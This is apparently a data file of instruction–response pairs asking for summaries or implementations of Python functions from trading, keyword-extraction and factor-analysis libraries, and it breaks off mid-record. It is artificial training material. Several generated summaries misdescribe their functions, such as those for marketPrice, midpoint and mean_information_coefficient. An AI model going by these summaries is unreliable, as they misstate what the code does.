{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef run(*awaitables, timeout: float = None):\n    loop = asyncio.get_event_loop()\n    if not awaitables:\n        if loop.is_running():\n            return\n        loop.run_forever()\n        f = asyncio.gather(*asyncio.Task.all_tasks())\n        f.cancel()\n        result = None\n        try:\n            loop.run_until_complete(f)\n        except asyncio.CancelledError:\n            pass\n    else:\n        if len(awaitables) == 1:\n            future = awaitables[0]\n        else:\n            future = asyncio.gather(*awaitables)\n        if timeout:\n            future = asyncio.wait_for(future, timeout)\n        task = asyncio.ensure_future(future)\n\n        def onError(_):\n            task.cancel()\n\n        globalErrorEvent.connect(onError)\n        try:\n            result = loop.run_until_complete(task)\n        except asyncio.CancelledError as e:\n            raise globalErrorEvent.value() or e\n        finally:\n            globalErrorEvent.disconnect(onError)\n\n    return result", "response": "Run the given asynchronous tasks and return the result."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef schedule(\n        time: Union[datetime.time, datetime.datetime],\n        callback: Callable, *args):\n    \"\"\"\n    Schedule the callback to be run at the given time with\n    the given arguments.\n\n    Args:\n        time: Time to run callback. If given as :py:class:`datetime.time`\n            then use today as date.\n        callback: Callable scheduled to run.\n        args: Arguments for to call callback with.\n    \"\"\"\n    dt = _fillDate(time)\n    now = datetime.datetime.now(dt.tzinfo)\n    delay = (dt - now).total_seconds()\n    loop = asyncio.get_event_loop()\n    loop.call_later(delay, callback, *args)", "response": "Schedules the given callback to be run at the given time."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef timeRange(\n        start: datetime.time, end: datetime.time,\n        step: float) -> Iterator[datetime.datetime]:\n    \"\"\"\n    Iterator that waits periodically until certain time points are\n    reached while yielding those time points.\n\n    Args:\n        start: Start time, can be specified as datetime.datetime,\n            or as datetime.time in which case today is used as the date\n        end: End time, can be specified as datetime.datetime,\n            or as datetime.time in which case today is used as the date\n        step (float): The number of seconds of each period\n    \"\"\"\n    assert step > 0\n    start = _fillDate(start)\n    end = _fillDate(end)\n    delta = datetime.timedelta(seconds=step)\n    t = start\n    while t < datetime.datetime.now():\n        t += delta\n    while t <= end:\n        waitUntil(t)\n        yield t\n        t += delta", "response": "Returns an iterator that waits periodically until certain time points are reached while yielding those time points."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\nasync def waitUntilAsync(t: datetime.time) -> bool:\n    t = _fillDate(t)\n    now = datetime.datetime.now(t.tzinfo)\n    secs = (t - now).total_seconds()\n    await asyncio.sleep(secs)\n    return True", "response": "Await until t is reached."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nstarts the main loop for Jupyter notebooks.", "response": "def startLoop():\n    \"\"\"\n    Use nested asyncio event loop for Jupyter notebooks.\n    \"\"\"\n    def _ipython_loop_asyncio(kernel):\n        '''\n        Use asyncio event loop for the given IPython kernel.\n        '''\n        loop = asyncio.get_event_loop()\n\n        def kernel_handler():\n            kernel.do_one_iteration()\n            loop.call_later(kernel._poll_interval, kernel_handler)\n\n        loop.call_soon(kernel_handler)\n        try:\n            if not loop.is_running():\n                loop.run_forever()\n        finally:\n            if not loop.is_running():\n                loop.run_until_complete(loop.shutdown_asyncgens())\n                loop.close()\n\n    patchAsyncio()\n    loop = asyncio.get_event_loop()\n    if not loop.is_running():\n        from ipykernel.eventloops import register_integration, enable_gui\n        register_integration('asyncio')(_ipython_loop_asyncio)\n        enable_gui('asyncio')"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nruns combined Qt event loop.", "response": "def useQt(qtLib: str = 'PyQt5', period: float = 0.01):\n    \"\"\"\n    Run combined Qt5/asyncio event loop.\n\n    Args:\n        qtLib: Name of Qt library to use, can be 'PyQt5' or 'PySide2'.\n        period: Period in seconds to poll Qt.\n    \"\"\"\n    def qt_step():\n        loop.call_later(period, qt_step)\n        if not stack:\n            qloop = QEventLoop()\n            timer = QTimer()\n            timer.timeout.connect(qloop.quit)\n            stack.append((qloop, timer))\n        qloop, timer = stack.pop()\n        timer.start(0)\n        qloop.exec_()\n        timer.stop()\n        stack.append((qloop, timer))\n\n    if qtLib not in ('PyQt5', 'PySide2'):\n        raise RuntimeError(f'Unknown Qt library: {qtLib}')\n    if qtLib == 'PyQt5':\n        from PyQt5.Qt import QApplication, QTimer, QEventLoop\n    else:\n        from PySide2.QtWidgets import QApplication\n        from PySide2.QtCore import QTimer, QEventLoop\n    global qApp\n    qApp = QApplication.instance() or QApplication(sys.argv)\n    loop = asyncio.get_event_loop()\n    stack: list = []\n    qt_step()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef formatIBDatetime(dt) -> str:\n    if not dt:\n        s = ''\n    elif isinstance(dt, datetime.datetime):\n        if dt.tzinfo:\n            # convert to local system timezone\n            dt = dt.astimezone()\n        s = dt.strftime('%Y%m%d %H:%M:%S')\n    elif isinstance(dt, datetime.date):\n        s = dt.strftime('%Y%m%d 23:59:59')\n    else:\n        s = dt\n    return s", "response": "Format date or datetime to string that IB uses."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing string in IB date or datetime format to datetime.", "response": "def parseIBDatetime(s):\n    \"\"\"\n    Parse string in IB date or datetime format to datetime.\n    \"\"\"\n    if len(s) == 8:\n        # YYYYmmdd\n        y = int(s[0:4])\n        m = int(s[4:6])\n        d = int(s[6:8])\n        dt = datetime.date(y, m, d)\n    elif s.isdigit():\n        dt = datetime.datetime.fromtimestamp(\n            int(s), datetime.timezone.utc)\n    else:\n        dt = datetime.datetime.strptime(s, '%Y%m%d  %H:%M:%S')\n    return dt"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef tuple(self):\n        return tuple(getattr(self, k) for k in self.__class__.defaults)", "response": "Return values as a tuple."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef dict(self):\n        return {k: getattr(self, k) for k in self.__class__.defaults}", "response": "Return key - value pairs as a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn differences between self and other as dictionary of 2 - tuples.", "response": "def diff(self, other):\n        \"\"\"\n        Return differences between self and other as dictionary of 2-tuples.\n        \"\"\"\n        diff = {}\n        for k in self.__class__.defaults:\n            left = getattr(self, k)\n            right = getattr(other, k)\n            if left != right:\n                diff[k] = (left, right)\n        return diff"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef nonDefaults(self):\n        nonDefaults = {}\n        for k, d in self.__class__.defaults.items():\n            v = getattr(self, k)\n            if v != d and (v == v or d == d):  # tests for NaN too\n                nonDefaults[k] = v\n        return nonDefaults", "response": "Get a dictionary of all attributes that differ from the default."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef startReq(self, key, contract=None, container=None):\n        future = asyncio.Future()\n        self._futures[key] = future\n        self._results[key] = container if container is not None else []\n        if contract:\n            self._reqId2Contract[key] = contract\n        return future", "response": "Start a new request and return the future that is associated\n with the key and container."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _endReq(self, key, result=None, success=True):\n        future = self._futures.pop(key, None)\n        self._reqId2Contract.pop(key, None)\n        if future:\n            if result is None:\n                result = self._results.pop(key, [])\n            if not future.done():\n                if success:\n                    future.set_result(result)\n                else:\n                    future.set_exception(result)", "response": "Finish the future of corresponding key with the given result."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstart a tick request that has the reqId associated with the contract.", "response": "def startTicker(self, reqId, contract, tickType):\n        \"\"\"\n        Start a tick request that has the reqId associated with the contract.\n        Return the ticker.\n        \"\"\"\n        ticker = self.tickers.get(id(contract))\n        if not ticker:\n            ticker = Ticker(\n                contract=contract, ticks=[], tickByTicks=[],\n                domBids=[], domAsks=[], domTicks=[])\n            self.tickers[id(contract)] = ticker\n        self.reqId2Ticker[reqId] = ticker\n        self._reqId2Contract[reqId] = contract\n        self.ticker2ReqId[tickType][ticker] = reqId\n        return ticker"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstart a live subscription.", "response": "def startSubscription(self, reqId, subscriber, contract=None):\n        \"\"\"\n        Register a live subscription.\n        \"\"\"\n        self._reqId2Contract[reqId] = contract\n        self.reqId2Subscriber[reqId] = subscriber"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nend a live subscription.", "response": "def endSubscription(self, subscriber):\n        \"\"\"\n        Unregister a live subscription.\n        \"\"\"\n        self._reqId2Contract.pop(subscriber.reqId, None)\n        self.reqId2Subscriber.pop(subscriber.reqId, None)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef execDetails(self, reqId, contract, execution):\n        if execution.orderId == UNSET_INTEGER:\n            # bug in TWS: executions of manual orders have unset value\n            execution.orderId = 0\n        key = self.orderKey(\n            execution.clientId, execution.orderId, execution.permId)\n        trade = self.trades.get(key)\n        if trade and contract.conId == trade.contract.conId:\n            contract = trade.contract\n        else:\n            contract = Contract.create(**contract.dict())\n        execId = execution.execId\n        execution.time = util.parseIBDatetime(execution.time). \\\n            astimezone(datetime.timezone.utc)\n        isLive = reqId not in self._futures\n        time = self.lastTime if isLive else execution.time\n        fill = Fill(contract, execution, CommissionReport(), time)\n        if execId not in self.fills:\n            # first time we see this execution so add it\n            self.fills[execId] = fill\n            if trade:\n                trade.fills.append(fill)\n                logEntry = TradeLogEntry(\n                    self.lastTime,\n                    trade.orderStatus.status,\n                    f'Fill {execution.shares}@{execution.price}')\n                trade.log.append(logEntry)\n                if isLive:\n                    self._logger.info(f'execDetails: {fill}')\n                    self.ib.execDetailsEvent.emit(trade, fill)\n                    trade.fillEvent(trade, fill)\n        if not isLive:\n            self._results[reqId].append(fill)", "response": "This wrapper handles both live fills and responses and responses from a request."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef connectionStats(self) -> ConnectionStats:\n        if not self.isReady():\n            raise ConnectionError('Not connected')\n        return ConnectionStats(\n            self._startTime,\n            time.time() - self._startTime,\n            self._numBytesRecv, self.conn.numBytesSent,\n            self._numMsgRecv, self.conn.numMsgSent)", "response": "Get statistics about the connection."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef getReqId(self) -> int:\n        if not self.isReady():\n            raise ConnectionError('Not connected')\n        newId = self._reqIdSeq\n        self._reqIdSeq += 1\n        return newId", "response": "Get a unique request ID."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndisconnect from IB connection.", "response": "def disconnect(self):\n        \"\"\"\n        Disconnect from IB connection.\n        \"\"\"\n        self.connState = Client.DISCONNECTED\n        if self.conn is not None:\n            self._logger.info('Disconnecting')\n            self.conn.disconnect()\n            self.wrapper.connectionClosed()\n            self.reset()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef send(self, *fields):\n        if not self.isConnected():\n            raise ConnectionError('Not connected')\n\n        msg = io.StringIO()\n        for field in fields:\n            typ = type(field)\n            if field in (None, UNSET_INTEGER, UNSET_DOUBLE):\n                s = ''\n            elif typ in (str, int, float):\n                s = str(field)\n            elif typ is bool:\n                s = '1' if field else '0'\n            elif typ is list:\n                # list of TagValue\n                s = ''.join(f'{v.tag}={v.value};' for v in field)\n            elif isinstance(field, Contract):\n                c = field\n                s = '\\0'.join(str(f) for f in (\n                    c.conId, c.symbol, c.secType,\n                    c.lastTradeDateOrContractMonth, c.strike,\n                    c.right, c.multiplier, c.exchange,\n                    c.primaryExchange, c.currency,\n                    c.localSymbol, c.tradingClass))\n            else:\n                s = str(field)\n            msg.write(s)\n            msg.write('\\0')\n        self.sendMsg(msg.getvalue())", "response": "Serialize and send the given fields using the IB socket protocol."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a message handler that invokes a wrapper method with the in - order message fields as parameters skipping over the first skip fields.", "response": "def wrap(self, methodName, types, skip=2):\n        \"\"\"\n        Create a message handler that invokes a wrapper method\n        with the in-order message fields as parameters, skipping over\n        the first ``skip`` fields, and parsed according to the ``types`` list.\n        \"\"\"\n\n        def handler(fields):\n            try:\n                args = [\n                    field if typ is str else\n                    int(field or 0) if typ is int else\n                    float(field or 0) if typ is float else\n                    bool(int(field or 0))\n                    for (typ, field) in zip(types, fields[skip:])]\n                method(*args)\n            except Exception:\n                self.logger.exception(f'Error for {methodName}:')\n\n        method = getattr(self.wrapper, methodName, None)\n        return handler if method else lambda *args: None"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndecodes fields and invoke corresponding wrapper method.", "response": "def interpret(self, fields):\n        \"\"\"\n        Decode fields and invoke corresponding wrapper method.\n        \"\"\"\n        try:\n            msgId = int(fields[0])\n            handler = self.handlers[msgId]\n            handler(fields)\n        except Exception:\n            self.logger.exception(f'Error handling fields: {fields}')"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse(self, obj):\n        for k, default in obj.__class__.defaults.items():\n            typ = type(default)\n            if typ is str:\n                continue\n            v = getattr(obj, k)\n            if typ is int:\n                setattr(obj, k, int(v or default))\n            elif typ is float:\n                setattr(obj, k, float(v or default))\n            elif typ is bool:\n                setattr(obj, k, bool(int(v or default)))", "response": "Parse the object s properties according to its default types."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef topics(self):\n        return set(node.tag for node in self.root.iter() if node.attrib)", "response": "Get the set of topics that can be extracted from this report."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nextract items of given topic and return as list of objects.", "response": "def extract(self, topic: str, parseNumbers=True) -> list:\n        \"\"\"\n        Extract items of given topic and return as list of objects.\n\n        The topic is a string like TradeConfirm, ChangeInDividendAccrual,\n        Order, etc.\n        \"\"\"\n        cls = type(topic, (DynamicObject,), {})\n        results = [cls(**node.attrib) for node in self.root.iter(topic)]\n        if parseNumbers:\n            for obj in results:\n                d = obj.__dict__\n                for k, v in d.items():\n                    with suppress(ValueError):\n                        d[k] = float(v)\n                        d[k] = int(v)\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef df(self, topic: str, parseNumbers=True):\n        return util.df(self.extract(topic, parseNumbers))", "response": "Returns the result as a pandas DataFrame."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndownloads report for the given token and queryId.", "response": "def download(self, token, queryId):\n        \"\"\"\n        Download report for the given ``token`` and ``queryId``.\n        \"\"\"\n        url = (\n                'https://gdcdyn.interactivebrokers.com'\n                f'/Universal/servlet/FlexStatementService.SendRequest?'\n                f't={token}&q={queryId}&v=3')\n        resp = urlopen(url)\n        data = resp.read()\n\n        root = et.fromstring(data)\n        if root.find('Status').text == 'Success':\n            code = root.find('ReferenceCode').text\n            baseUrl = root.find('Url').text\n            _logger.info('Statement is being prepared...')\n        else:\n            errorCode = root.find('ErrorCode').text\n            errorMsg = root.find('ErrorMessage').text\n            raise FlexError(f'{errorCode}: {errorMsg}')\n\n        while True:\n            time.sleep(1)\n            url = f'{baseUrl}?q={code}&t={token}'\n            resp = urlopen(url)\n            self.data = resp.read()\n            self.root = et.fromstring(self.data)\n            if self.root[0].tag == 'code':\n                msg = self.root[0].text\n                if msg.startswith('Statement generation in progress'):\n                    _logger.info('still working...')\n                    continue\n                else:\n                    raise FlexError(msg)\n            break\n        _logger.info('Statement retrieved.')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nloading report from XML file.", "response": "def load(self, path):\n        \"\"\"\n        Load report from XML file.\n        \"\"\"\n        with open(path, 'rb') as f:\n            self.data = f.read()\n            self.root = et.fromstring(self.data)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsaves report to XML file.", "response": "def save(self, path):\n        \"\"\"\n        Save report to XML file.\n        \"\"\"\n        with open(path, 'wb') as f:\n            f.write(self.data)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating and a return a specialized contract based on the given secType.", "response": "def create(**kwargs):\n        \"\"\"\n        Create and a return a specialized contract based on the given secType,\n        or a general Contract if secType is not given.\n        \"\"\"\n        secType = kwargs.get('secType', '')\n        cls = {\n            '': Contract,\n            'STK': Stock,\n            'OPT': Option,\n            'FUT': Future,\n            'CONTFUT': ContFuture,\n            'CASH': Forex,\n            'IND': Index,\n            'CFD': CFD,\n            'BOND': Bond,\n            'CMDTY': Commodity,\n            'FOP': FuturesOption,\n            'FUND': MutualFund,\n            'WAR': Warrant,\n            'IOPT': Warrant,\n            'BAG': Bag,\n            'NEWS': Contract\n        }.get(secType, Contract)\n        if cls is not Contract:\n            kwargs.pop('secType', '')\n        return cls(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef hasBidAsk(self) -> bool:\n        return (\n            self.bid != -1 and not isNan(self.bid) and self.bidSize > 0 and\n            self.ask != -1 and not isNan(self.ask) and self.askSize > 0)", "response": "See if this ticker has a valid bid and ask."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the midpoint of the current session.", "response": "def midpoint(self) -> float:\n        \"\"\"\n        Return average of bid and ask, or NaN if no valid bid and ask\n        are available.\n        \"\"\"\n        return (self.bid + self.ask) / 2 if self.hasBidAsk() else nan"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the first available one of the current order and the last price if within current bid and ask.", "response": "def marketPrice(self) -> float:\n        \"\"\"\n        Return the first available one of\n\n        * last price if within current bid/ask;\n        * average of bid and ask (midpoint);\n        * close price.\n        \"\"\"\n        price = self.last if (\n            self.hasBidAsk() and self.bid <= self.last <= self.ask) else \\\n            self.midpoint()\n        if isNan(price):\n            price = self.close\n        return price"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_keywords_from_list(self, keyword_list):\n        if not isinstance(keyword_list, list):\n            raise AttributeError(\"keyword_list should be a list\")\n\n        for keyword in keyword_list:\n            self.add_keyword(keyword)", "response": "To add keywords from a list of keywords to the current object"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove_keywords_from_list(self, keyword_list):\n        if not isinstance(keyword_list, list):\n                raise AttributeError(\"keyword_list should be a list\")\n\n        for keyword in keyword_list:\n            self.remove_keyword(keyword)", "response": "To remove keywords present in list\n           "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsearching in the string for all keywords present in corpus and returns a list of lists of all keywords present in the corpus.", "response": "def extract_keywords(self, sentence, span_info=False):\n        \"\"\"Searches in the string for all keywords present in corpus.\n        Keywords present are added to a list `keywords_extracted` and returned.\n\n        Args:\n            sentence (str): Line of text where we will search for keywords\n\n        Returns:\n            keywords_extracted (list(str)): List of terms/keywords found in sentence that match our corpus\n\n        Examples:\n            >>> from flashtext import KeywordProcessor\n            >>> keyword_processor = KeywordProcessor()\n            >>> keyword_processor.add_keyword('Big Apple', 'New York')\n            >>> keyword_processor.add_keyword('Bay Area')\n            >>> keywords_found = keyword_processor.extract_keywords('I love Big Apple and Bay Area.')\n            >>> keywords_found\n            >>> ['New York', 'Bay Area']\n\n        \"\"\"\n        keywords_extracted = []\n        if not sentence:\n            # if sentence is empty or none just return empty list\n            return keywords_extracted\n        if not self.case_sensitive:\n            sentence = sentence.lower()\n        current_dict = self.keyword_trie_dict\n        sequence_start_pos = 0\n        sequence_end_pos = 0\n        reset_current_dict = False\n        idx = 0\n        sentence_len = len(sentence)\n        while idx < sentence_len:\n            char = sentence[idx]\n            # when we reach a character that might denote word end\n            if char not in self.non_word_boundaries:\n\n                # if end is present in current_dict\n                if self._keyword in current_dict or char in current_dict:\n                    # update longest sequence found\n                    sequence_found = None\n                    longest_sequence_found = None\n                    is_longer_seq_found = False\n                    if self._keyword in current_dict:\n                        sequence_found = current_dict[self._keyword]\n                        longest_sequence_found = current_dict[self._keyword]\n                        sequence_end_pos = idx\n\n                    # re look for longest_sequence from this position\n                    if char in current_dict:\n                        current_dict_continued = current_dict[char]\n\n                        idy = idx + 1\n                        while idy < sentence_len:\n                            inner_char = sentence[idy]\n                            if inner_char not in self.non_word_boundaries and self._keyword in current_dict_continued:\n                                # update longest sequence found\n                                longest_sequence_found = current_dict_continued[self._keyword]\n                                sequence_end_pos = idy\n                                is_longer_seq_found = True\n                            if inner_char in current_dict_continued:\n                                current_dict_continued = current_dict_continued[inner_char]\n                            else:\n                                break\n                            idy += 1\n                        else:\n                            # end of sentence reached.\n                            if self._keyword in current_dict_continued:\n                                # update longest sequence found\n                                longest_sequence_found = current_dict_continued[self._keyword]\n                                sequence_end_pos = idy\n                                is_longer_seq_found = True\n                        if is_longer_seq_found:\n                            idx = sequence_end_pos\n                    current_dict = self.keyword_trie_dict\n                    if longest_sequence_found:\n                        keywords_extracted.append((longest_sequence_found, sequence_start_pos, idx))\n                    reset_current_dict = True\n                else:\n                    # we reset current_dict\n                    current_dict = self.keyword_trie_dict\n                    reset_current_dict = True\n            elif char in current_dict:\n                # we can continue from this char\n                current_dict = current_dict[char]\n            else:\n                # we reset current_dict\n                current_dict = self.keyword_trie_dict\n                reset_current_dict = True\n                # skip to end of word\n                idy = idx + 1\n                while idy < sentence_len:\n                    char = sentence[idy]\n                    if char not in self.non_word_boundaries:\n                        break\n                    idy += 1\n                idx = idy\n            # if we are end of sentence and have a sequence discovered\n            if idx + 1 >= sentence_len:\n                if self._keyword in current_dict:\n                    sequence_found = current_dict[self._keyword]\n                    keywords_extracted.append((sequence_found, sequence_start_pos, sentence_len))\n            idx += 1\n            if reset_current_dict:\n                reset_current_dict = False\n                sequence_start_pos = idx\n        if span_info:\n            return keywords_extracted\n        return [value[0] for value in keywords_extracted]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsearching in the string for all keywords present in corpus and replaces them with the clean name.", "response": "def replace_keywords(self, sentence):\n        \"\"\"Searches in the string for all keywords present in corpus.\n        Keywords present are replaced by the clean name and a new string is returned.\n\n        Args:\n            sentence (str): Line of text where we will replace keywords\n\n        Returns:\n            new_sentence (str): Line of text with replaced keywords\n\n        Examples:\n            >>> from flashtext import KeywordProcessor\n            >>> keyword_processor = KeywordProcessor()\n            >>> keyword_processor.add_keyword('Big Apple', 'New York')\n            >>> keyword_processor.add_keyword('Bay Area')\n            >>> new_sentence = keyword_processor.replace_keywords('I love Big Apple and bay area.')\n            >>> new_sentence\n            >>> 'I love New York and Bay Area.'\n\n        \"\"\"\n        if not sentence:\n            # if sentence is empty or none just return the same.\n            return sentence\n        new_sentence = []\n        orig_sentence = sentence\n        if not self.case_sensitive:\n            sentence = sentence.lower()\n        current_word = ''\n        current_dict = self.keyword_trie_dict\n        current_white_space = ''\n        sequence_end_pos = 0\n        idx = 0\n        sentence_len = len(sentence)\n        while idx < sentence_len:\n            char = sentence[idx]\n            current_word += orig_sentence[idx]\n            # when we reach whitespace\n            if char not in self.non_word_boundaries:\n                current_white_space = char\n                # if end is present in current_dict\n                if self._keyword in current_dict or char in current_dict:\n                    # update longest sequence found\n                    sequence_found = None\n                    longest_sequence_found = None\n                    is_longer_seq_found = False\n                    if self._keyword in current_dict:\n                        sequence_found = current_dict[self._keyword]\n                        longest_sequence_found = current_dict[self._keyword]\n                        sequence_end_pos = idx\n\n                    # re look for longest_sequence from this position\n                    if char in current_dict:\n                        current_dict_continued = current_dict[char]\n                        current_word_continued = current_word\n                        idy = idx + 1\n                        while idy < sentence_len:\n                            inner_char = sentence[idy]\n                            current_word_continued += orig_sentence[idy]\n                            if inner_char not in self.non_word_boundaries and self._keyword in current_dict_continued:\n                                # update longest sequence found\n                                current_white_space = inner_char\n                                longest_sequence_found = current_dict_continued[self._keyword]\n                                sequence_end_pos = idy\n                                is_longer_seq_found = True\n                            if inner_char in current_dict_continued:\n                                current_dict_continued = current_dict_continued[inner_char]\n                            else:\n                                break\n                            idy += 1\n                        else:\n                            # end of sentence reached.\n                            if self._keyword in current_dict_continued:\n                                # update longest sequence found\n                                current_white_space = ''\n                                longest_sequence_found = current_dict_continued[self._keyword]\n                                sequence_end_pos = idy\n                                is_longer_seq_found = True\n                        if is_longer_seq_found:\n                            idx = sequence_end_pos\n                            current_word = current_word_continued\n                    current_dict = self.keyword_trie_dict\n                    if longest_sequence_found:\n                        new_sentence.append(longest_sequence_found + current_white_space)\n                        current_word = ''\n                        current_white_space = ''\n                    else:\n                        new_sentence.append(current_word)\n                        current_word = ''\n                        current_white_space = ''\n                else:\n                    # we reset current_dict\n                    current_dict = self.keyword_trie_dict\n                    new_sentence.append(current_word)\n                    current_word = ''\n                    current_white_space = ''\n            elif char in current_dict:\n                # we can continue from this char\n                current_dict = current_dict[char]\n            else:\n                # we reset current_dict\n                current_dict = self.keyword_trie_dict\n                # skip to end of word\n                idy = idx + 1\n                while idy < sentence_len:\n                    char = sentence[idy]\n                    current_word += orig_sentence[idy]\n                    if char not in self.non_word_boundaries:\n                        break\n                    idy += 1\n                idx = idy\n                new_sentence.append(current_word)\n                current_word = ''\n                current_white_space = ''\n            # if we are end of sentence and have a sequence discovered\n            if idx + 1 >= sentence_len:\n                if self._keyword in current_dict:\n                    sequence_found = current_dict[self._keyword]\n                    new_sentence.append(sequence_found)\n                else:\n                    new_sentence.append(current_word)\n            idx += 1\n        return \"\".join(new_sentence)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef factor_information_coefficient(factor_data,\n                                   group_adjust=False,\n                                   by_group=False):\n    \"\"\"\n    Computes the Spearman Rank Correlation based Information Coefficient (IC)\n    between factor values and N period forward returns for each period in\n    the factor index.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    group_adjust : bool\n        Demean forward returns by group before computing IC.\n    by_group : bool\n        If True, compute period wise IC separately for each group.\n\n    Returns\n    -------\n    ic : pd.DataFrame\n        Spearman Rank correlation between factor and\n        provided forward returns.\n    \"\"\"\n\n    def src_ic(group):\n        f = group['factor']\n        _ic = group[utils.get_forward_returns_columns(factor_data.columns)] \\\n            .apply(lambda x: stats.spearmanr(x, f)[0])\n        return _ic\n\n    factor_data = factor_data.copy()\n\n    grouper = [factor_data.index.get_level_values('date')]\n\n    if group_adjust:\n        factor_data = utils.demean_forward_returns(factor_data,\n                                                   grouper + ['group'])\n    if by_group:\n        grouper.append('group')\n\n    ic = factor_data.groupby(grouper).apply(src_ic)\n\n    return ic", "response": "Computes the Spearman Rank Correlation based Information Coefficient between factor values and N period forward returns for each group."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncalculating the mean information coefficient between two groups of the same type.", "response": "def mean_information_coefficient(factor_data,\n                                 group_adjust=False,\n                                 by_group=False,\n                                 by_time=None):\n    \"\"\"\n    Get the mean information coefficient of specified groups.\n    Answers questions like:\n    What is the mean IC for each month?\n    What is the mean IC for each group for our whole timerange?\n    What is the mean IC for for each group, each week?\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    group_adjust : bool\n        Demean forward returns by group before computing IC.\n    by_group : bool\n        If True, take the mean IC for each group.\n    by_time : str (pd time_rule), optional\n        Time window to use when taking mean IC.\n        See http://pandas.pydata.org/pandas-docs/stable/timeseries.html\n        for available options.\n\n    Returns\n    -------\n    ic : pd.DataFrame\n        Mean Spearman Rank correlation between factor and provided\n        forward price movement windows.\n    \"\"\"\n\n    ic = factor_information_coefficient(factor_data, group_adjust, by_group)\n\n    grouper = []\n    if by_time is not None:\n        grouper.append(pd.Grouper(freq=by_time))\n    if by_group:\n        grouper.append('group')\n\n    if len(grouper) == 0:\n        ic = ic.mean()\n\n    else:\n        ic = (ic.reset_index().set_index('date').groupby(grouper).mean())\n\n    return ic"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef factor_weights(factor_data,\n                   demeaned=True,\n                   group_adjust=False,\n                   equal_weight=False):\n    \"\"\"\n    Computes asset weights by factor values and dividing by the sum of their\n    absolute value (achieving gross leverage of 1). Positive factor values will\n    results in positive weights and negative values in negative weights.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    demeaned : bool\n        Should this computation happen on a long short portfolio? if True,\n        weights are computed by demeaning factor values and dividing by the sum\n        of their absolute value (achieving gross leverage of 1). The sum of\n        positive weights will be the same as the negative weights (absolute\n        value), suitable for a dollar neutral long-short portfolio\n    group_adjust : bool\n        Should this computation happen on a group neutral portfolio? If True,\n        compute group neutral weights: each group will weight the same and\n        if 'demeaned' is enabled the factor values demeaning will occur on the\n        group level.\n    equal_weight : bool, optional\n        if True the assets will be equal-weighted instead of factor-weighted\n        If demeaned is True then the factor universe will be split in two\n        equal sized groups, top assets with positive weights and bottom assets\n        with negative weights\n\n    Returns\n    -------\n    returns : pd.Series\n        Assets weighted by factor 